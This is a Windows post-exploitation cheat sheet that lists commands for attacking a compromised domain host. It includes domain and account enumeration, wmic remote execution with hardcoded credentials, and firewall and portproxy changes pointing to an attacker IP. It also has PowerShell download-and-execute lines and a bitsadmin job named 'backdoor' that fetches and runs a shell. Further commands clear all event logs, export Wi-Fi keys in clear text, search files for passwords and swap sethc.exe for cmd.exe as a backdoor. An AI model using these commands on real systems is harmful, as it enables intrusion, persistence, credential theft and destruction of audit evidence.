**Authors**: < [nixawk](https://github.com/nixawk) >

----

```
net view
net view /domain
net view /domain:DOMAINNAME
net view \\domain-control
net user
net user /domain
net localgroup administrators
net localgroup administrators /domain
net group /domain
net group "Domain Admins" /domain
net group "Domain Computers" /domain
net group "Domain Controllers" /domain
net group "Group Policy Creator Owners" /domain
net time /domain
net config
net session
net use \\ip\ipc$ password /user:username
net share
net accounts /domain
```

```
wmic useraccount
wmic useraccount LIST FULL
wmic useraccount LIST BRIEF
wmic useraccount LIST STATUS
wmic startup
wmic share
wmic service
wmic process where name="[PROCESS]" call terminate
wmic process where ProcessId="[PID]" call terminate
wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create "cmd /c vssadmin list shadows 2>&1 > c:\temp\output.txt"
wmic qfe get hotfixid
wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber
wmic bios
wmic bios LIST FULL
```

```
netsh firewall show conf
netsh firewall set service type = remotedesktop mode = enable
netsh firewall add allowedprogram C:\nltest.exe mltest enable
netsh firewall add portopening tcp 2482 lt enable all
netsh int portproxy v4tov4 listenport=80 connecthost=[AttackerIP] connectport=80
netsh wlan show profiles
netsh wlan export profile folder=. key=clear
netsh wlan set hostednetwork mode=[allow\|disallow]
netsh wlan set hostednetwork ssid=<ssid> key=<passphrase> keyUsage=persistent\|temporary
netsh wlan [start|stop] hostednetwork
```

```
netstat -ano
netstat -ano -p tcp
netstat -ano -p udp
```

```
tasklist /V
tasklist /M
tasklist /FI "IMAGENAME eq cmd.exe"
tasklist /FI "PID eq 4060"
```

```
ipconfig /all
ipconfig /displaydns
```


```
powershell.exe -w hidden -nop -ep bypass -c "IEX ((new-object net.webclient).downloadstring('http://[domainname|IP]:[port]/[file]'))"
powershell.exe -w hidden -nop -ep bypass -c "(new-object net.webclient).DownloadFile('http://ip:port/file', 'C:\Windows\temp\testfile')"
```

```
bitsadmin /create backdoor
bitsadmin /addfile backdoor http://192.168.20.10/theshell.exe C:\windows\temp\theshell.exe
bitsadmin /SETMINRETRYDELAY 88000
bitsadmin /SETNOTIFYCMDLINE backdoor C:\windows\temp\theshell.exe NULL
bitsadmin /getnotifycmdline backdoor
bitsadmin /listfiles backdoor
bitsadmin /RESUME backdoor     # Run the backdoor
```

```
for /f %a in ('wevtutil el') do @wevtutil cl "%a"
del %WINDIR%\*.log /a /s /q /f
```

```
sc create cmdsys type= own type= interact binPath= "c:\windows\system32\cmd.exe /c cmd.exe" & sc start cmdsys
```

```
route print
arp -a
qwinsta
qprocess
nbtstat -A ip
fsutil fsinfo drivers
wmic volume LIST BRIEF
systeminfo
at 13:20 /interactive cmd
type C:\Windows\system32\demo.txt
gpresult /Z
dir /b /s | find /I "password"
FOR /F %f in ('dir /b /s C:\') do find /I "password" %f
```

```
Replacing file as: sethc.exe
@echo off
c: > nul\cd\ > nul\cd %SYSTEMROOT%\System32\ > nul
if exist %SYSTEMROOT%\System32\cmdsys\ rd /q %SYSTEMROOT%\System32\cmdsys\ > nul
cmd %SYSTEMROOT%\System32\cmdsys\ > nul
copy /y c:\windows\system32\cmd.exe c:\windows\system32\cmdsys\cmd.bkp /y > nul
copy /y c:\windows\system32\sethc.exe c:\windows\system32\cmdsys\sethc.bkp /y > nul
copy /y c:\windows\system32\cmd.exe c:\windows\system32\cmdsys\sethc.exe /y > nul
copy /y c:\windows\system32\cmdsys\sethc.exe c:\windows\system32\sethc.exe /y > nul
exit
```


## References

1. http://pwnwiki.io/
